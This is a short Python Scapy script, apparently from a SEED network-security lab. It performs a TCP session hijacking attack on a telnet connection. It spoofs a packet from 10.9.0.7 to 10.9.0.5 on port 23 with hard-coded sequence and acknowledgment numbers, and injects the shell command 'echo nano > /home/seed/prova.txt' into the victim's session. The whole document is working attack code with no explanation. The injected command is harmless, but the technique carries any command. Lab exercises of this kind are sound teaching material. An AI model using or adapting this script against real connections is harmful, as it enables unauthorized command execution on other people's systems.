 #!/usr/bin/env python3
from scapy.all import *

data = "echo nano > /home/seed/prova.txt \r\n"
ip = IP(src="10.9.0.7", dst="10.9.0.5")
tcp = TCP(sport=41836, dport=23, flags="A", seq=2466625397, ack=1586760183)

pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
